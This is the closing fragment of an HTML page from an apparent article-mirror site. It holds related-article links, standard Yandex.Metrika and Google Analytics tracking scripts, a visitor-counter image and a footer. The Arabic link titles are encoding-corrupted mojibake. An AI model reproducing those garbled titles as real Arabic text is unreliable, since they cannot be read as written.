<li><a href="../ar458928/index.html">XLNet ููุงุจู ุจูุฑุช</a></li>
<li><a href="../ar458930/index.html">ููู ูุตู ุทูุงุจ ุจูุฑู ุฅูู ููุงุฆูุงุช ุจุทููุฉ ุชุญููู ุงูุจูุงูุงุช ุงูุฏูููุฉ 2019 ููุฃุณ ุงูุจูุงูุงุช</a></li>
<li><a href="../ar458932/index.html">ููุชุง - ุฃู ููู ููููู ูุนุฑูุฉ ูู ุดูุก</a></li>
<li><a href="../ar458934/index.html">ูุดุฑ ุงูุชุทุจููุงุช ุนูู ูุฌููุนุงุช Kubernetes ูุชุนุฏุฏุฉ ูุน Helm</a></li>
<li><a href="../ar458936/index.html">"ูู ุงูุณูู ุงูุฅุฌุงุจุฉ ุจุฏูุงู ูู ุงูุตูุช" - ููุงุจูุฉ ูุจูุฑุฉ ูุน ูุงูุฏ ุฐุงูุฑุฉ ุงููุนุงููุงุช ุ ููุฑูุณ ููุฑููุดู</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>